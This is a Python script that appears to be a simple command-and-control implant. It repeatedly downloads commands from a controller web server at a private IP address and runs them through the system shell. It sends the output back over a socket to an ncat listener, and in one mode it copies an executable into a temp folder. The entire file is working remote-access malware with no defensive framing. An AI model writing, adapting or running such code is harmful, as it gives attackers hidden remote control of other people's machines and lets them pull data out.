import requests
import time
import socket
import subprocess

#ip
HOST = "192.168.2.63"
#port
PORT = 5000
#to make it run once
runonce = False

copy = "copy command.exe %TEMP%\\folder1\\"

while True:

    try:



        url = "http://" + HOST + "/cmd.txt"
        activate = "http://" + HOST + "/cmda.txt"

        r = requests.get(url)
        a = requests.get(activate)
        # download the files and read

        r.raise_for_status()
        a.raise_for_status()

        # strip whitespaces
        cmd = r.text.strip()
        act = a.text.strip()

        # if activated
        if act == "1":
            # connect to the ncat listener
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as i:
                i.connect((HOST, PORT))
                #run command in cmd.txt
                run = subprocess.Popen(
                    cmd,
                    text=True,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT
                )
                peer = i.getpeername()


                # send the output to the listener
                assert run.stdout is not None
                for line in run.stdout:
                    i.sendall(line.encode())
                try:
                    peer = i.getpeername()
                    i.sendall(peer.encode())
                except socket.error:
                    print("not connected")

        if act == "3":
            # connect to the ncat listener
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                #run command in cmd.txt
                run3 = subprocess.Popen(
                    cmd,
                    text=True,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT
                )
                # send the output to the listener
                assert run3.stdout is not None
                try:
                    peer = s.getpeername()
                    s.sendall(f"\nconnected to {peer[0]}:{peer[1]}\n".encode())
                    run3.wait()
                except socket.error:
                    print("not connected")
                time.sleep(0.5)
        if act == "4":
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as p:
                p.connect((HOST, PORT))
                run4 = subprocess.Popen(
                    copy,
                    text=True,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT
                )

                assert run4.stdout is not None
                for line in run4.stdout:
                    p.sendall(line.encode())



        #if runonce:
        #   with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as f:
        #        rtruecommand = terminal.rcommand.strip()
        #        ran = subprocess.Popen(
        #            rtruecommand,
        #            text=True,
        #            shell=True,
        #            stdout=subprocess.PIPE,
        #            stderr=subprocess.STDOUT
        #        )
        #        f.connect((HOST, PORT))
        #        assert ran.stdout is not None
        #        for line in ran.stdout:
        #            f.sendall(line.encode())
        #            runonce = False

    # if error keep going
    except Exception as e:
        print(e)
        time.sleep(3)


